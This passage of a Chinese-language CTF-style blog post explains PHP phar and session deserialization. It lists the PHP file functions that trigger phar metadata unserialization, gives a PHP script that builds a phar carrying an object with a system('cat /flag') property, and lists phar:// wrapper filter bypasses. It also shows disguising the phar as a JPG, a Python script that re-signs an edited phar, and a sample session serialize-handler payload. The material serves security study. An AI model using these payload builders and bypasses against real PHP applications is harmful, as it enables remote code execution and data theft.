+<h3 id="phar反序列化" class="heading-element"><span>phar反序列化</span>
+  <a href="#phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="利用条件" class="heading-element"><span>利用条件</span>
+  <a href="#%e5%88%a9%e7%94%a8%e6%9d%a1%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><ul>
+<li>phar文件可上传</li>
+<li>文件流操作函数如<code>file_exists()</code>，<code>file_get_contents()</code>等影响函数要有可利用的魔术方法做跳板</li>
+<li>文件流参数可控，且<code>phar://</code>没有被过滤，或可绕过</li>
+</ul>
+<h4 id="影响函数" class="heading-element"><span>影响函数</span>
+  <a href="#%e5%bd%b1%e5%93%8d%e5%87%bd%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><ul>
+<li>filetime()</li>
+<li>filectime()</li>
+<li>file_exits()</li>
+<li>file_get_contents()</li>
+<li>file_put_contents()</li>
+<li>file()</li>
+<li>filegroup()</li>
+<li>fopen()</li>
+<li>fileinode()</li>
+<li>filetime()</li>
+<li>fileowner()</li>
+<li>fileperms()</li>
+<li>is_dir()</li>
+<li>is_executable()</li>
+<li>is_file()</li>
+<li>is_link()</li>
+<li>is_readable()</li>
+<li>is_writable()</li>
+<li>is_writeable()</li>
+<li>parse_ini_file()</li>
+<li>copy()</li>
+<li>unlike()</li>
+<li>stat()</li>
+<li>readfile()</li>
+</ul>
+<h4 id="构造phar文件" class="heading-element"><span>构造phar文件</span>
+  <a href="#%e6%9e%84%e9%80%a0phar%e6%96%87%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">class LoveNss{
+</span></span><span class="line"><span class="cl">    public $ljt=&#34;Misc&#34;;
+</span></span><span class="line"><span class="cl">    public $dky=&#34;Re&#34;;
+</span></span><span class="line"><span class="cl">    public $cmd=&#34;system(&#39;cat /flag&#39;);&#34;;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$a = new LoveNss();
+</span></span><span class="line"><span class="cl">echo serialize($a);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 下面这部分就没改
+</span></span><span class="line"><span class="cl">$phar = new Phar(&#34;phar.phar&#34;);
+</span></span><span class="line"><span class="cl">$phar-&gt;startBuffering();
+</span></span><span class="line"><span class="cl">$phar-&gt;setStub(&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;); // 设置 stub
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$phar-&gt;setMetadata($a); // 将自定义的 meta-data 存入 manifest
+</span></span><span class="line"><span class="cl">$phar-&gt;addFromString(&#34;test.txt&#34;, &#34;test&#34;); // 添加要压缩的文件
+</span></span><span class="line"><span class="cl">// 签名自动计算
+</span></span><span class="line"><span class="cl">$phar-&gt;stopBuffering();</span></span></code></pre></td></tr></table>
+</div>
+</div><p>读取这个直接<code>phar://文件名</code></p>
+<blockquote>
+<p>记得加上文件相对位置</p>
+</blockquote>
+<h4 id="绕过方法" class="heading-element"><span>绕过方法</span>
+  <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><ol>
+<li>
+<p><code>compress.bzip2://phar://</code></p>
+</li>
+<li>
+<p><code>compress.zlib://phar:///</code></p>
+</li>
+<li>
+<p><code>php://filter/resource=phar://</code></p>
+</li>
+<li>
+<p><code>$z = 'compress.bzip2://phar:///home/sx/test.phar/test.txt';</code></p>
+</li>
+<li>
+<p><strong>绕过__HALT_COMPILER ();检测</strong></p>
+<p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code></p>
+<p>这段代码，对前面的内容或者后缀名是没有要求的。</p>
+<p>那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">system(&#34;gzip newtest.phar&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// 将压缩后的1.phar文件重命名为1.jpg
+</span></span><span class="line"><span class="cl">rename(&#34;newtest.phar.gz&#34;, &#34;1.jpg&#34;);</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ol>
+<p>​	最后把文件上传后在删除文件处抓包，<code>?filename=phar://1.jpg</code>即可</p>
+<ol start="6">
+<li>
+<p><strong>绕过<code>__construct</code></strong></p>
+<p>先010里面把序列化字符修改成员数</p>
+<p>然后重新签名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha1</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;phar.phar&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">f</span><span class="p">[:</span><span class="o">-</span><span class="mi">28</span><span class="p">]</span> <span class="c1"># 获取要签名的数据</span>
+</span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="n">f</span><span class="p">[</span><span class="o">-</span><span class="mi">8</span><span class="p">:]</span> <span class="c1"># 获取签名类型和 GBMB 标识</span>
+</span></span><span class="line"><span class="cl"><span class="n">newf</span> <span class="o">=</span> <span class="n">s</span> <span class="o">+</span> <span class="n">sha1</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span> <span class="o">+</span> <span class="n">h</span> <span class="c1"># 数据 + 签名 + (类型 + GBMB)</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;newtest.phar&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">newf</span><span class="p">)</span> <span class="c1"># 写入新文件</span></span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ol>
+<h4 id="session反序列化" class="heading-element"><span>session反序列化</span>
+  <a href="#session%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><h5 id="漏洞原理" class="heading-element"><span>漏洞原理</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p><code>//ini_set('session.serialize_handler', 'php');</code>
+<code>//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</code>
+当php_serialize处理器处理接收session，php处理器处理session时便会造成反序列化的可利用</p>
+<p>因为php处理器是有一个<code>|</code>间隔符，当php_serialize处理器传入时在序列化字符串前加上<code>|</code>，即<code>|O:7:&quot;xiaoxin&quot;:1:{s:4:&quot;name&quot;;s:7:&quot;xiaoxin&quot;;}&quot;</code></p>
+<p>此时session值为<code>a:1:{s:7:&quot;session&quot;;s:44:&quot;|O:7:&quot;xiaoxin:1:{s:4:&quot;name&quot;;s:7:&quot;xiaoxin&quot;;}&quot;;}</code>当php处理器处理时，会把<code>|</code>当作间隔符，取出后面的值去反序列化，即是我们构造的payload：</p>
+<p><code>|O:7:&quot;xiaoxin:1:{s:4:&quot;name&quot;;s:7:&quot;xiaoxin&quot;;}&quot;</code></p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-10-30 11:25:40">Updated on 2024-10-30&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/2024web-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://Tin10g.github.io/posts/2024web-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-title="PHP反序列化" data-hashtags="Web,PHP漏洞"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://Tin10g.github.io/posts/2024web-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-hashtag="Web"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://Tin10g.github.io/posts/2024web-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-title="PHP反序列化"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/web/" class="post-tag" title="Tags - Web">Web</a><a href="/tags/php%E6%BC%8F%E6%B4%9E/" class="post-tag" title="Tags - PHP漏洞">PHP漏洞</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/2024web-cve-2021-29454smarty%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="post-nav-item" rel="prev" title="Smarty模板注入"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Smarty模板注入</a><a href="/posts/2024web-misc/" class="post-nav-item" rel="next" title="Misc">Misc<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+        Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">Disqus</a>.
+      </noscript></div></article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.136.5">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.13">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="Tin10g.github.io">Ting</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><script src="https://goodlunatic.disqus.com/embed.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":1000},"comment":{"enable":true,"expired":false},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.13"};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
